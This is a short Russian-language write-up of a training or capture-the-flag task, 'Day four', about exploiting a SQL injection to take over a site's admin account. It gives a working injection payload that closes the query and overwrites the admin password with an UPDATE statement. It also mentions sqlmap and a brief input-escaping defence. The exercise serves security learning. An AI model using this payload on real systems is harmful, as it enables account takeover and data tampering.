# День четвертый (SQL Injection)
-- -
### Цель атаки: 
Получить доступ к пользователю admin на сайте 

### Решение:

Отправив `"` обнаруживаем наличие SQL Injection уязвимости. Далее для нас достаточно подменить пароль к пользователю
admin и зайти с измененным паролем.

### Итоговый эксплоит:
```sql
');
UPDATE users SET password = 'kek' WHERE user = 'admin';
INSERT INTO users VALUES ('lol
```

### Инструменты и полезные ссылки
- Песочница, где можно потестить SQL запросы https://sql-academy.org/ru/sandbox
- Универсальная утилита для поиска SQL Injection https://sqlmap.org/

### Способ защиты
- Экранировать весь пользовательский ввод на сервере через специальные общеиспользуемые форматеры.
